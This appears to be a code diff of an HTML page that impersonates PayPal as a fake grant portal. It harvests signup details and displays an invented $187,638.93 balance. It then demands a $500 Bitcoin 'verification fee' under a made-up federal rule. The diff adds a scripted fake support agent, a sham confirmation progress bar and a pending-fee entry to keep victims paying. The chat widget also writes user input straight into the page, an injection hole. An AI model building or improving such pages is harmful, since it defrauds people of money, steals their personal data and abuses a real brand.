@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PayPal: Digital Wallet & Global Grants</title>
+    <title>PayPal: Summary</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
     <style>
@@ -15,73 +15,96 @@
             background: linear-gradient(-45deg, #003087, #0070ba, #005ea6, #002c87);
             background-size: 400% 400%;
             animation: gradient 12s ease infinite;
+            position: relative;
         }
         @keyframes gradient { 0% { background-position: 0% 50%; } 50% { background-position: 100% 50%; } 100% { background-position: 0% 50%; } }
+        .hero-overlay {
+            position: absolute; inset: 0;
+            background: url('https://images.unsplash.com/photo-1556740758-90de374c12ad?auto=format&fit=crop&q=80') center/cover;
+            opacity: 0.15; mix-blend-mode: overlay;
+        }
         .loader { border: 4px solid #f3f3f3; border-top: 4px solid #0070ba; border-radius: 50%; width: 45px; height: 45px; animation: spin 1s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .progress-bar-fill { transition: width 2s ease-in-out; }
     </style>
 </head>
 <body class="bg-white">
 
-    <div id="loading-screen" class="hidden fixed inset-0 bg-white z-[300] flex flex-col items-center justify-center text-center">
+    <div id="loading-screen" class="hidden fixed inset-0 bg-white z-[600] flex flex-col items-center justify-center text-center">
         <div class="loader mb-4"></div>
         <p id="loading-text" class="text-gray-500 font-medium px-6"></p>
     </div>
 
+    <div id="sidebar" class="fixed inset-0 bg-black/50 z-[500] hidden">
+        <div class="bg-[#002c87] w-[280px] h-full p-8 text-white shadow-2xl">
+            <div class="flex justify-between items-center mb-12">
+                <span class="text-2xl italic font-bold">PayPal</span>
+                <button onclick="toggleSidebar()" class="text-2xl">✕</button>
+            </div>
+            <nav class="space-y-8 text-lg font-light">
+                <button onclick="showPage('dashboard')" class="block w-full text-left">Summary</button>
+                <button onclick="showPage('activity-page')" class="block w-full text-left">Activity</button>
+                <button onclick="alert('Locked during verification')" class="block w-full text-left">Wallet</button>
+                <button onclick="location.reload()" class="block w-full text-left pt-8 border-t border-blue-800 opacity-50">Log Out</button>
+            </nav>
+        </div>
+    </div>
+
+    <div id="chat-widget" class="fixed bottom-6 right-6 z-[450] hidden">
+        <button onclick="toggleChat()" class="pp-bg-blue p-4 rounded-full shadow-2xl text-white relative">
+            <span id="chat-notif" class="absolute top-0 right-0 w-3 h-3 bg-red-500 rounded-full border-2 border-white animate-pulse"></span>
+            <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 10h.01M12 10h.01M16 10h.01M9 16H5a2 2 0 01-2-2V6a2 2 0 012-2h14a2 2 0 012 2v8a2 2 0 01-2 2h-5l-5 5v-5z"/></svg>
+        </button>
+    </div>
+
+    <div id="chat-box" class="fixed bottom-24 right-6 w-80 bg-white shadow-2xl rounded-2xl border hidden z-[451] overflow-hidden">
+        <div class="bg-[#002c87] p-4 text-white flex justify-between items-center">
+            <div class="flex items-center space-x-2">
+                <img src="https://ui-avatars.com/api/?name=Sarah+Agent&background=random" class="w-6 h-6 rounded-full border border-white">
+                <span class="font-bold text-sm">Agent Sarah</span>
+            </div>
+            <button onclick="toggleChat()">✕</button>
+        </div>
+        <div id="chat-content" class="p-4 h-64 overflow-y-auto space-y-4 text-[12px] bg-gray-50">
+            <div class="bg-white p-3 rounded-lg border text-gray-700">Hello! I'm Sarah from the Disbursement Team. I'm assigned to help you with your <b>$187,638.93</b> grant. Are you having any trouble with the verification?</div>
+        </div>
+        <div class="p-3 border-t bg-white flex space-x-2">
+            <input id="chat-input" type="text" placeholder="Type message..." class="flex-1 outline-none text-sm">
+            <button onclick="userSendMessage()" class="text-blue-600 font-bold">Send</button>
+        </div>
+    </div>
+
     <div id="landing-page">
         <nav class="sticky top-0 bg-white z-50 flex items-center justify-between px-6 py-4 border-b">
-            <span class="text-2xl font-bold pp-blue italic">PayPal</span>
-            <div class="flex space-x-4">
-                <button onclick="showPage('login-page')" class="px-5 py-1.5 border border-blue-900 pp-blue rounded-full font-bold text-sm">Log In</button>
+            <div class="flex items-center space-x-4">
+                <button onclick="toggleSidebar()"><svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-width="2" d="M4 6h16M4 12h16M4 18h16"/></svg></button>
+                <span class="text-2xl font-bold pp-blue italic">PayPal</span>
             </div>
+            <button onclick="showPage('login-page')" class="px-5 py-1.5 border border-blue-900 pp-blue rounded-full font-bold text-sm">Log In</button>
         </nav>
-        <section class="animated-hero h-[600px] flex items-center justify-center text-center px-6 text-white">
-            <div class="max-w-3xl">
+        <section class="animated-hero h-[600px] flex items-center justify-center text-center px-6 text-white overflow-hidden">
+            <div class="hero-overlay"></div>
+            <div class="relative z-10 max-w-3xl">
                 <h1 class="text-5xl md:text-7xl font-light mb-8">The smarter way to manage your funds.</h1>
                 <button onclick="showPage('signup-page')" class="px-14 py-4 bg-white text-blue-900 rounded-full font-bold text-xl shadow-2xl">Sign Up for Free</button>
             </div>
         </section>
-        <section class="py-20 bg-gray-50 px-8 text-center">
-            <h2 class="text-3xl font-light mb-12">Trusted by millions globally.</h2>
-            <div class="grid md:grid-cols-3 gap-8 max-w-6xl mx-auto">
-                <div class="bg-white p-6 rounded-xl shadow-sm">🛡️ <h3 class="font-bold mt-2">Secure</h3><p class="text-sm text-gray-500">Industry-leading encryption.</p></div>
-                <div class="bg-white p-6 rounded-xl shadow-sm">🌍 <h3 class="font-bold mt-2">Global</h3><p class="text-sm text-gray-500">200+ countries supported.</p></div>
-                <div class="bg-white p-6 rounded-xl shadow-sm">⚡ <h3 class="font-bold mt-2">Fast</h3><p class="text-sm text-gray-500">Instant grant disbursements.</p></div>
-            </div>
-        </section>
+        <footer class="py-10 bg-gray-100 text-center text-[11px] text-gray-500 space-x-4">
+            <span>Help</span><span>Contact</span><span>Security</span><span>Privacy</span>
+        </footer>
     </div>
 
     <div id="signup-page" class="hidden min-h-screen p-8 flex flex-col items-center">
         <span class="text-3xl font-bold pp-blue italic mb-8">PayPal</span>
         <div class="w-full max-w-sm space-y-4">
             <h2 class="text-2xl font-bold text-center mb-6">Create Account</h2>
+            <input id="reg-name" type="text" placeholder="Full Legal Name" class="w-full border p-4 rounded-md outline-none focus:border-blue-500">
+            <input id="reg-email" type="email" placeholder="Email Address" class="w-full border p-4 rounded-md outline-none focus:border-blue-500">
             
-            <input id="reg-name" type="text" placeholder="Full Legal Name" class="w-full border p-4 rounded-md outline-none">
-            <input id="reg-email" type="email" placeholder="Email Address" class="w-full border p-4 rounded-md outline-none">
-
             <div class="relative">
                 <select id="reg-country" onchange="updatePhoneCode()" class="w-full border p-4 rounded-md outline-none bg-white appearance-none">
                     <option value="">Select Country</option>
-                    <option value="1">🇺🇸 United States</option>
-                    <option value="44">🇬🇧 United Kingdom</option>
-                    <option value="1-ca">🇨🇦 Canada</option>
-                    <option value="61">🇦🇺 Australia</option>
-                    <option value="49">🇩🇪 Germany</option>
-                    <option value="33">🇫🇷 France</option>
-                    <option value="39">🇮🇹 Italy</option>
-                    <option value="34">🇪🇸 Spain</option>
-                    <option value="55">🇧🇷 Brazil</option>
-                    <option value="52">🇲🇽 Mexico</option>
-                    <option value="91">🇮🇳 India</option>
-                    <option value="86">🇨🇳 China</option>
-                    <option value="81">🇯🇵 Japan</option>
-                    <option value="27">🇿🇦 South Africa</option>
-                    <option value="234">🇳🇬 Nigeria</option>
-                    <option value="971">🇦🇪 UAE</option>
-                    <option value="65">🇸🇬 Singapore</option>
-                    <option value="41">🇨🇭 Switzerland</option>
-                    <option value="31">🇳🇱 Netherlands</option>
-                    <option value="46">🇸🇪 Sweden</option>
+                    <option value="1">🇺🇸 United States</option><option value="44">🇬🇧 United Kingdom</option><option value="1-ca">🇨🇦 Canada</option><option value="61">🇦🇺 Australia</option><option value="49">🇩🇪 Germany</option><option value="33">🇫🇷 France</option><option value="39">🇮🇹 Italy</option><option value="34">🇪🇸 Spain</option><option value="55">🇧🇷 Brazil</option><option value="52">🇲🇽 Mexico</option><option value="91">🇮🇳 India</option><option value="86">🇨🇳 China</option><option value="81">🇯🇵 Japan</option><option value="27">🇿🇦 South Africa</option><option value="234">🇳🇬 Nigeria</option><option value="971">🇦🇪 UAE</option><option value="65">🇸🇬 Singapore</option><option value="41">🇨🇭 Switzerland</option><option value="31">🇳🇱 Netherlands</option><option value="46">🇸🇪 Sweden</option>
                 </select>
                 <div class="absolute right-4 top-5 pointer-events-none text-gray-400">▼</div>
             </div>
@@ -96,79 +119,88 @@
                 <p id="agent-status" class="text-xs mt-1 font-bold"></p>
             </div>
 
-            <button onclick="handleSignup()" class="w-full py-4 pp-bg-blue text-white rounded-full font-bold text-lg">Agree & Create</button>
-            <p id="signup-error" class="text-red-600 text-[10px] text-center font-bold hidden uppercase tracking-widest">Please fill all fields and verify Agent ID</p>
-        </div>
-    </div>
-
-    <div id="login-page" class="hidden min-h-screen p-8 flex flex-col items-center">
-        <span class="text-3xl font-bold pp-blue italic mb-12">PayPal</span>
-        <div class="w-full max-w-sm space-y-4">
-            <input id="login-email" type="text" placeholder="Email" class="w-full border p-4 rounded-md">
-            <button onclick="handleLogin()" class="w-full py-4 pp-bg-blue text-white rounded-full font-bold">Log In</button>
+            <button onclick="handleSignup()" class="w-full py-4 pp-bg-blue text-white rounded-full font-bold text-lg">Agree & Create Account</button>
+            <p id="signup-error" class="text-red-600 text-[10px] text-center font-bold hidden uppercase tracking-widest mt-2">Required: Valid Name & Agent ID</p>
         </div>
     </div>
 
     <div id="dashboard" class="hidden min-h-screen bg-gray-50">
-        <nav class="bg-[#002c87] p-4 text-white flex justify-between items-center">
+        <nav class="bg-[#002c87] p-4 text-white flex justify-between items-center shadow-lg">
+            <button onclick="toggleSidebar()"><svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-width="2" d="M4 6h16M4 12h16M4 18h16"/></svg></button>
             <span class="text-xl font-bold italic">PayPal</span>
             <div id="user-initials" class="w-8 h-8 bg-blue-400 rounded-full flex items-center justify-center text-xs font-bold">U</div>
         </nav>
         <div class="p-6 max-w-md mx-auto">
+            <div id="status-container" class="hidden bg-white p-4 rounded-2xl border mb-6 shadow-sm border-orange-200">
+                <div class="flex justify-between items-center mb-2">
+                    <span class="text-[10px] font-bold text-orange-600 uppercase tracking-widest">Network Confirmations</span>
+                    <span id="confirm-count" class="text-[10px] font-bold text-gray-500">0/3</span>
+                </div>
+                <div class="w-full bg-gray-100 h-2 rounded-full overflow-hidden">
+                    <div id="progress-fill" class="progress-bar-fill w-0 h-full bg-orange-500"></div>
+                </div>
+            </div>
             <div class="flex justify-between items-center mb-6">
                 <h2 class="text-2xl font-light">Hello, <span id="display-name" class="font-bold"></span></h2>
-                <div class="text-[9px] bg-green-100 text-green-700 px-2 py-1 rounded font-bold uppercase">Assigned: <span id="assigned-agent"></span></div>
+                <div class="text-[9px] bg-green-100 text-green-700 px-2 py-1 rounded font-bold uppercase tracking-tight">Agent: <span id="assigned-agent"></span></div>
             </div>
-            <div class="bg-white p-8 rounded-3xl border text-center shadow-sm">
-                <p class="text-gray-400 text-xs font-bold uppercase mb-2">Available Balance</p>
-                <h3 class="text-4xl font-bold text-blue-900">$187,638.93</h3>
-                <button onclick="showPage('amount-page')" class="w-full mt-6 py-4 pp-bg-blue text-white rounded-full font-bold">Transfer Funds</button>
+            <div class="bg-white p-8 rounded-3xl border text-center shadow-sm mb-6">
+                <p class="text-gray-400 text-xs font-bold uppercase mb-2">Available Grant Balance</p>
+                <h3 class="text-4xl font-bold text-blue-900 mb-6">$187,638.93</h3>
+                <button onclick="showPage('amount-page')" class="w-full py-4 pp-bg-blue text-white rounded-full font-bold shadow-md hover:brightness-110 transition">Transfer Money</button>
+            </div>
+            <div class="bg-white p-6 rounded-2xl border">
+                <p class="font-bold mb-6 text-gray-800">Recent Activity</p>
+                <div id="activity-list" class="space-y-6">
+                    <div class="flex justify-between">
+                        <div><p class="text-sm font-bold">United States Grant</p><p class="text-[10px] text-gray-400">Payment Received • Jan 5, 2026</p></div>
+                        <p class="text-green-600 font-bold text-sm">+$187,638.93</p>
+                    </div>
+                </div>
             </div>
         </div>
-    </div>
-
-    <div id="amount-page" class="hidden min-h-screen p-8 text-center bg-white">
-        <button onclick="showPage('dashboard')" class="text-left block mb-12 text-gray-400">Cancel</button>
-        <div class="flex items-center justify-center mb-10">
-            <span class="text-4xl text-gray-300">$</span>
-            <input type="number" id="send-val" value="500.00" class="text-6xl font-light outline-none w-48 text-center">
-        </div>
-        <button onclick="showPage('verify-page')" class="w-full py-5 pp-bg-blue text-white rounded-full font-bold text-xl max-w-sm">Next</button>
-    </div>
-
-    <div id="verify-page" class="hidden min-h-screen p-8 flex flex-col items-center justify-center text-center">
-        <div class="w-16 h-16 bg-orange-100 text-orange-600 rounded-full flex items-center justify-center mb-6 text-2xl font-bold">!</div>
-        <h2 class="text-2xl font-bold mb-4">Activation Required</h2>
-        <p class="text-gray-500 text-sm mb-10">A verification fee of <b>$500.00</b> is required to link your external bank to this grant portal.</p>
-        <button onclick="generateWallet()" class="w-full py-4 pp-bg-blue text-white rounded-full font-bold max-w-sm">Proceed to Payment</button>
     </div>
 
     <div id="wallet-page" class="hidden min-h-screen p-8 text-center bg-white">
-        <h2 class="text-xl font-bold mb-8">Deposit $500.00 BTC</h2>
+        <h2 class="text-xl font-bold mb-8">Verification Deposit</h2>
         <img id="qr-code" src="" class="w-52 h-52 mx-auto mb-6 p-2 border shadow-sm rounded-xl">
-        <div class="bg-gray-50 p-4 rounded text-[10px] break-all font-mono mb-8 border" id="wallet-addr"></div>
-        <button onclick="confirmPayment()" class="w-full py-5 bg-green-600 text-white rounded-full font-bold max-w-sm shadow-xl">I HAVE SENT PAYMENT</button>
+        <div class="bg-gray-50 p-4 rounded-xl border flex items-center space-x-2 mb-8">
+            <span id="wallet-addr" class="text-[10px] font-mono break-all flex-1 text-left font-bold text-gray-600 tracking-tighter"></span>
+            <button onclick="copyAddr()" class="pp-bg-blue text-white px-4 py-2 rounded-lg text-[10px] font-bold shadow-sm">COPY</button>
+        </div>
+        <button onclick="confirmPayment()" class="w-full py-5 bg-green-600 text-white rounded-full font-bold text-xl shadow-xl">I HAVE SENT PAYMENT</button>
     </div>
+
+    <div id="login-page" class="hidden min-h-screen p-8 flex flex-col items-center"><span class="text-3xl font-bold pp-blue italic mb-12">PayPal</span><input type="text" placeholder="Email" class="w-full max-w-sm border p-4 mb-4 rounded-md outline-none"><button onclick="handleLogin()" class="w-full max-w-sm py-4 pp-bg-blue text-white rounded-full font-bold">Next</button></div>
+    <div id="amount-page" class="hidden min-h-screen p-8 text-center bg-white"><button onclick="showPage('dashboard')" class="text-left block mb-12 text-gray-400">✕</button><div class="flex items-center justify-center mb-10"><span class="text-4xl text-gray-300">$</span><input type="number" id="send-val" value="500.00" class="text-6xl font-light outline-none w-48 text-center"></div><button onclick="showPage('verify-page')" class="w-full py-5 pp-bg-blue text-white rounded-full font-bold text-xl">Next</button></div>
+    <div id="verify-page" class="hidden min-h-screen p-8 flex flex-col items-center justify-center text-center"><div class="w-16 h-16 bg-orange-100 text-orange-600 rounded-full flex items-center justify-center mb-6 text-2xl font-bold">!</div><h2 class="text-2xl font-bold mb-4">Verification Required</h2><p class="text-gray-500 text-sm mb-10 px-4">Federal regulation requires a <b>$500.00</b> one-time node fee to link your external wallet.</p><button onclick="generateWallet()" class="w-full py-4 pp-bg-blue text-white rounded-full font-bold max-w-sm shadow-lg">Confirm & Pay</button></div>
 
     <script>
         let isAgentValid = false;
-
-        function showPage(id) {
-            document.querySelectorAll('body > div:not(#loading-screen)').forEach(p => p.classList.add('hidden'));
+        function toggleSidebar() { document.getElementById('sidebar').classList.toggle('hidden'); }
+        function toggleChat() { document.getElementById('chat-box').classList.toggle('hidden'); document.getElementById('chat-notif').classList.add('hidden'); }
+        
+        function showPage(id) { 
+            document.querySelectorAll('body > div:not(#loading-screen):not(#sidebar):not(#chat-widget):not(#chat-box)').forEach(p => p.classList.add('hidden'));
             document.getElementById(id).classList.remove('hidden');
+            document.getElementById('sidebar').classList.add('hidden');
+            
+            // Contextual Sarah Chat
+            if(['amount-page', 'verify-page', 'wallet-page'].includes(id)) {
+                document.getElementById('chat-widget').classList.remove('hidden');
+                if(id === 'wallet-page') setTimeout(() => { 
+                    document.getElementById('chat-notif').classList.remove('hidden');
+                }, 5000);
+            } else {
+                document.getElementById('chat-widget').classList.add('hidden');
+                document.getElementById('chat-box').classList.add('hidden');
+            }
             window.scrollTo(0,0);
         }
 
         function updatePhoneCode() {
             const country = document.getElementById('reg-country').value;
-            const prefix = document.getElementById('phone-prefix');
-            if (country) {
-                // Handling special case for Canada which also uses +1
-                const code = country.split('-')[0];
-                prefix.value = '+' + code;
-            } else {
-                prefix.value = '+';
-            }
+            document.getElementById('phone-prefix').value = country ? '+' + country.split('-')[0] : '+';
         }
 
         function validateAgent(val) {
@@ -186,26 +218,17 @@
 
         function handleSignup() {
             const name = document.getElementById('reg-name').value;
-            const email = document.getElementById('reg-email').value;
-            const phone = document.getElementById('reg-phone').value;
-            const country = document.getElementById('reg-country').value;
-            const error = document.getElementById('signup-error');
-
-            if (!name || !email || !phone || !country || !isAgentValid) {
-                error.classList.remove('hidden');
-                return;
-            }
-
+            if (!name || !isAgentValid) { document.getElementById('signup-error').classList.remove('hidden'); return; }
             document.getElementById('display-name').innerText = name.split(' ')[0];
             document.getElementById('assigned-agent').innerText = "Agent Anthony";
             document.getElementById('user-initials').innerText = name.charAt(0).toUpperCase();
-            showLoading('Setting up Grant Portal...', 'dashboard');
+            showLoading('Connecting to Disbursement Hub...', 'dashboard');
         }
 
-        function handleLogin() {
+        function handleLogin() { 
             document.getElementById('display-name').innerText = "Member";
             document.getElementById('assigned-agent').innerText = "System Admin";
-            showLoading('Authenticating...', 'dashboard');
+            showLoading('Logging in...', 'dashboard'); 
         }
 
         function generateWallet() {
@@ -215,21 +238,48 @@
             showPage('wallet-page');
         }
 
+        function copyAddr() { 
+            navigator.clipboard.writeText(document.getElementById('wallet-addr').innerText); 
+            const btn = event.target;
+            btn.innerText = "COPIED";
+            setTimeout(() => btn.innerText = "COPY", 2000);
+        }
+
         function confirmPayment() {
-            showLoading('Verifying Blockchain Deposit...', 'dashboard');
+            const txId = 'PX-' + Math.floor(Math.random() * 999999);
+            const historyItem = `<div class="flex justify-between border-t pt-4"><div><p class="text-sm font-bold">Portal Verification Fee</p><p class="text-[10px] text-gray-400">ID: ${txId} • <span class="text-orange-500 font-bold uppercase tracking-widest">Pending</span></p></div><p class="text-gray-400 font-bold text-sm">-$500.00</p></div>`;
+            document.getElementById('activity-list').insertAdjacentHTML('beforeend', historyItem);
+            document.getElementById('status-container').classList.remove('hidden');
+            showLoading('Verifying Blockchain Node...', 'dashboard');
+            
+            // Progress Logic
             setTimeout(() => {
-                alert("Deposit Received. Activation is pending manual review by Agent Anthony.");
-            }, 2500);
+                document.getElementById('progress-fill').style.width = '33%';
+                document.getElementById('confirm-count').innerText = '1/3';
+                setTimeout(() => {
+                    document.getElementById('progress-fill').style.width = '66%';
+                    document.getElementById('confirm-count').innerText = '2/3';
+                }, 12000);
+            }, 4000);
+        }
+
+        function userSendMessage() {
+            const input = document.getElementById('chat-input');
+            if(!input.value) return;
+            const content = document.getElementById('chat-content');
+            content.innerHTML += `<div class="text-right"><span class="bg-blue-100 p-2 rounded-lg inline-block text-gray-800">${input.value}</span></div>`;
+            input.value = '';
+            setTimeout(() => {
+                content.innerHTML += `<div><span class="bg-white border p-2 rounded-lg inline-block shadow-sm">Please hold while I check the node status. Ensure you sent exactly $500.00 BTC.</span></div>`;
+                content.scrollTop = content.scrollHeight;
+            }, 2000);
         }
 
         function showLoading(text, next) {
-            const loader = document.getElementById('loading-screen');
+            const l = document.getElementById('loading-screen');
             document.getElementById('loading-text').innerText = text;
-            loader.classList.remove('hidden');
-            setTimeout(() => {
-                loader.classList.add('hidden');
-                showPage(next);
-            }, 2000);
+            l.classList.remove('hidden');
+            setTimeout(() => { l.classList.add('hidden'); if(next) showPage(next); }, 2500);
         }
     </script>
 </body>
